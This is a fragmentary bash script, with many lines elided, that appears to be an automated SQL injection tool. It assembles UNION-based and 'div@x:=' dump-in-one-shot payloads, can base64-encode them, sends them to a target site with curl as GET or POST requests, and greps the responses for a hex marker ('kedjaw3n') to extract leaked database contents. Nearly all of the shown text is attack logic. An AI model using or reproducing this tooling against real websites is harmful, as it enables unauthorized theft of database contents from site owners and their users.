   ...
   if cat .angka >/dev/null
    ...
    if [[ "$based64" = "y" ]]
      ...
      its=$(echo -e "$colom--+" | sed 's/0x6b65646a6177336e3//g')
       ...
       if [[ "$html" = "y" ]]
        then
          ds=$(echo -e "$param1$union$dk$param2")
        else
          if [[ "$postd" = "y" ]]
          then
            ds=$(echo -e "$union$dk")
       ...
       if [[ "$based64" = "y" ]]
        then
          ...
          if [[ "$postd" = "y" ]]
          then
             info=$(curl -s -LX POST "$site" --data "$postnya=null$db" | grep -a -o "kedjaw3n&[^<]*" | tail -1 | sed 's/&/\n/g' | sed '/kedjaw3n/d')
          else
   ...
   then
    ...
    if [[ "$based64" = "y" ]]
       ...
       if [[ "$based64" = "y" ]]
        then
          st=$(echo "`cut -d "=" -f1 <<< $site`=" )
          bs90=$(echo -e "null+div@x:=$dio$union$dk")
          base440=$(sed "s#$por#$dor#g" <<< $bs90)
       ...
       if [[ "$postd" = "y" ]]
       then
        ds=$(echo -e "+div@x:=$dio$union$dk")
       else
        ds=$(echo -e "$site+div@x:=$dio$union$dk")
       fi
